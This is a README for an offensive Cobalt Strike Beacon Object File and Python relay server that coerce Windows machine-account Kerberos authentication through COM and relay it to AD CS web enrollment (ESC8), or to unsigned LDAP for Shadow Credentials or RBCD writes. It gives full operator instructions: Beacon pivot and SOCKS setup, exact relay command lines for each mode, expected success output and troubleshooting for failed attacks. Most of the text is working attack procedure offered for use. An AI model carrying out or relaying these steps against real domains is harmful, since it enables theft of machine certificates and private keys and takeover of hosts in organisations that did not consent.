# KrbRelay BOF

A single-process Beacon Object File implementation of COM coercion and Kerberos relay. The BOF forwards machine-account authentication to a Python relay server for:

- AD CS Web Enrollment (ESC8) over HTTP or HTTPS
- Shadow Credentials over unsigned LDAP
- Resource-Based Constrained Delegation (RBCD) over unsigned LDAP

The Windows side is only a BOF. It does not upload an EXE, spawn a sacrificial process, inject code, or use sRDI/PIC.

The relay server stops after receiving the PFX or performing the directory write. It does not automatically request/import Kerberos tickets or execute the final S4U sequence.

## Build and load

```bash
make clean
make
make verify
```

This produces `bof/krbrelay.x64.o`. The default Makefile expects x64 MinGW-w64 at `/tmp/krb-mingw-root`; set `MINGW_PREFIX` if yours is elsewhere.

Load `krbrelay.cna` through Cobalt Strike's Script Manager. It adds:

```text
krbrelay <relay_port> <service_spn> <rpc_endpoint>
```

- `relay_port`: Python listener and `rportfwd_local` port.
- `service_spn`: `http/CA_FQDN` or `ldap/DC_FQDN`.
- `rpc_endpoint`: free loopback TCP port used by the temporary COM resolver. This is not the relay port.

## Network setup

If AD CS/the DC is reached through a Beacon pivot, use two Beacons. On the proxy/forward Beacon:

```text
sleep 0
socks 9050
rportfwd_local 9598 127.0.0.1 9598
```

Keep this Beacon and the Cobalt client that created `rportfwd_local` connected. Run Python on that same client and run the BOF on a separate x64 Beacon, normally at sleep `5`.

The relay server must be listening before executing `krbrelay`.

## ESC8 usage

From the relay directory:

```bash
cd relay
proxychains4 python3 relay_server.py esc8 \
  --port 9598 \
  --adcs-host CA.example.test --adcs-address 10.0.0.12 \
  --domain example.test --machine WORKSTATION \
  --template Machine \
  --pfx-out 'WORKSTATION-{request_id}.pfx'
```

Then run this on the KrbRelay Beacon:

```text
krbrelay 9598 http/CA.example.test 7989
```

For HTTPS Web Enrollment, add `--adcs-tls`. The SPN remains `http/CA.example.test`.

### ESC8 success output

```text
[*] IIS returned HTTP 200; the persistent HTTP connection is authenticated as the relayed machine account
[*] ADCS issued request <ID>; retrieving the certificate on the authenticated connection
[+] Saved passwordless machine PKCS#12 to WORKSTATION-<ID>.pfx
[+] Machine certificate acquired and key pair verified (request <ID>)
[+] AD CS relay completed
```

The PFX contains the issued certificate and matching private key.

## Shadow Credentials usage

From the relay directory:

```bash
cd relay
proxychains4 python3 relay_server.py shadowcred \
  --port 9598 \
  --ldap-host DC01.example.test --ldap-address 10.0.0.11 \
  --domain example.test --machine WORKSTATION \
  --target-dn 'CN=WORKSTATION,OU=Workstations,DC=example,DC=test' \
  --pfx-out 'shadow-{request_id}.pfx'
```

Then run:

```text
krbrelay 9598 ldap/DC01.example.test 7989
```

Expected success:

```text
[*] LDAP final bind succeeded; validating the queued directory write
[+] Added Shadow Credential to WORKSTATION$
[+] Saved passwordless shadow credential PKCS#12 to shadow-<ID>.pfx
[+] Shadow Credential DeviceId: <GUID>
[+] Shadow Credential KeyId: <SHA256 key identifier>
[+] Shadow Credentials relay completed
```

Success requires result `0` for both the final LDAP bind and queued ModifyResponse. `--target-dn` identifies the exact computer object, including its OU. The script will not overwrite an existing NGC Shadow Credential value.

## RBCD usage

RBCD requires the SID of an account you control that has an SPN, commonly a computer account whose password you know. From the relay directory:

```bash
cd relay
proxychains4 python3 relay_server.py rbcd \
  --port 9598 \
  --ldap-host DC01.example.test --ldap-address 10.0.0.11 \
  --domain example.test --machine WORKSTATION \
  --target-dn 'CN=WORKSTATION,OU=Workstations,DC=example,DC=test' \
  --delegate-account CONTROLLED$ \
  --delegate-sid 'S-1-5-21-111111111-222222222-333333333-1234'
```

Then run:

```text
krbrelay 9598 ldap/DC01.example.test 7989
```

Expected success:

```text
[*] LDAP final bind succeeded; validating the queued directory write
[+] RBCD delegate added: CONTROLLED$ (S-1-5-21-...) -> WORKSTATION$
[+] RBCD relay completed
```

This replaces `msDS-AllowedToActOnBehalfOfOtherIdentity` with a descriptor containing the supplied SID. The final S4U/ticket sequence is left to the operator.

## BOF success output

```text
[*] Initializing COM/RPC relay
[+] Existing Kerberos-capable COM security accepted
[*] Relay service principal: http/CA.example.test
[+] COM resolver ready: ncacn_ip_tcp:127.0.0.1[7989]
[*] Triggering COM object: McpManagementService
[+] Relay bridge connected via 127.0.0.1:9598
[*] Relayed authentication leg 1
[*] Applied relay continuation to authentication leg 1
[*] Relayed authentication leg 2
[+] Relay target authenticated the machine account
[+] Cleanup complete: resolver removed, SSPI restored, VEH removed
```

BOF success proves the target accepted the relayed account. For AD CS/Shadow Credentials, also verify Python's output and PFX. For LDAP, verify the ModifyResponse—not only the SASL bind.

## Repeating a relay

One BOF task performs one COM activation and one relay session. To repeat it:

1. Start a fresh relay server for the next session.
2. Execute `krbrelay` as a new Beacon task.

Reusing the same `service_spn` in separate tasks is supported. When changing between HTTP and LDAP SPNs, use another non-proxy Beacon because COM can retain process-wide authentication state.

## Troubleshooting

### Python never accepts the bridge

- Start Python before the BOF.
- Confirm the exact `rportfwd_local relay_port 127.0.0.1 relay_port` entry.
- Keep the rport Beacon at sleep `0`.
- Recreate the reverse forward after reconnecting its Cobalt client.

### Python cannot reach AD CS or the DC

- Confirm SOCKS is running and its local port matches the command.
- Run the relay server through proxychains so its outbound target connection uses the Beacon SOCKS route.
- The SPN hostname, IIS Host header, and selected service must agree.

### LDAP binds but modification fails

- Read the LDAP result and diagnostic text.
- Confirm LDAP signing is not enforced.
- Confirm the exact target DN and update rights.
- Shadow Credentials refuses an existing NGC value; remove only your controlled value before retrying.

### Direct LDAPS fails

Direct Kerberos SASL relay to LDAPS is unsupported. The coerced RPC context requests integrity, and AD rejects SASL integrity over TLS. Disabling EPA does not remove this restriction.

### BOF reports a COM/stage error

Use a free `rpc_endpoint`, retain the complete stage/status line, and check whether the Beacon survived. VEH is the vectored exception handler used to report faults and restore temporary hooks/state before the object unloads.

## Files

Only two components participate in a relay:

| File | Purpose |
| --- | --- |
| `bof/krbrelay.x64.o` | COM coercion, RPC resolver, SSPI interception, and KRB1 transport |
| `relay/relay_server.py` | Persistent AD CS/LDAP connection and selected action |

`krbrelay.cna` loads the object. `Makefile`, `bof/krbrelay.c`, and `bof/beacon.h` are needed only to rebuild it.

## Current support

| Mode | Status |
| --- | --- |
| Kerberos to AD CS HTTP/ESC8 | Working |
| Kerberos to AD CS HTTPS/ESC8 | Working |
| Kerberos to LDAP Shadow Credentials | Working when signing is not enforced |
| Kerberos to LDAP RBCD | Directory write working when signing is not enforced |
| Direct Kerberos relay to LDAPS | Not supported |
| LDAP with signing enforced | Not supported |

## References

- [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
